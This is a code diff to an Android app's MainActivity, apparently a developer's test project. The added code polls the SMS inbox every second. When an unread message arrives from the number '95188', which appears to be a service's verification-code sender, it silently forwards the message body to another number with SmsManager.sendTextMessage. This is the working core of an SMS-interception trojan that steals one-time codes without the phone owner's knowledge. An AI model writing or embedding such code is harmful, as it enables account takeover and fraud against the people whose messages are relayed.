@@ -13,7 +13,6 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.telephony.SmsManager;
 import android.util.Log;
-import android.view.LayoutInflater.Filter;
 import android.view.Menu;
 import android.view.View;
 import android.widget.Button;
@@ -28,8 +27,9 @@ public class MainActivity extends Activity {
 	
 	int smsCount = 0;
 	Handler handler;
-	int scanInterval = 5000;
-	
+	int scanInterval = 1000;
+	MyService mService;
+	Intent intent;
 	
 	private Runnable runnable = new Runnable() {
 		@Override
@@ -38,19 +38,28 @@ public class MainActivity extends Activity {
       /* and here comes the "trick" */
 			
 			Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
-			Log.v("carlos", cur.getCount()+" : "+smsCount);
-			String sms = "";
+//			Log.v("carlos", cur.getCount()+" : "+smsCount);
+//			String sms = "";
+			int i  = 0;
 			if(cur.getCount() > smsCount)
 			{
-					 while(cur.moveToNext())
+				i = cur.getCount() - smsCount;
+					 while(cur.moveToNext() && i > 0)
 					 {
 						 
 //						 sms = "";
 //						 sms += cur.getString(8) + " From " + cur.getString(5) + " : " + cur.getString(13) + "\n";
-						 if(cur.getString(8).equals("0"))
+						 if(cur.getString(8).equals("0") && cur.getString(5).equals("95188"))
 						 {
 							 Log.v("calos", "you have a new message");
+							 SmsManager sms1 = SmsManager.getDefault();
+							 List<String> texts = sms1.divideMessage("hello carlos");
+							 for (String text : texts) {
+			            		sms1.sendTextMessage("123456", null, cur.getString(13), null, null);
+							 }
+							 
 						 }
+						 i--;
 //						 Log.v("carlos", sms);
 
 					 }	
@@ -114,6 +123,9 @@ public class MainActivity extends Activity {
 		           
 		        }
 		    });
+//		 intent = new Intent(this,MyService.class);
+//		 startService(new Intent("com.carlos.testbroadcastreceiverMyService"));
+//		 startService(intent);
 
 	}
 	
@@ -146,7 +158,6 @@ public class MainActivity extends Activity {
 				String message = bundle.getString("message");
 				Log.v("carlos", "receive MyReceiver broadcast: "+message);
 				textView.setText(message);
-				
 			}
 		 }   
 	   }
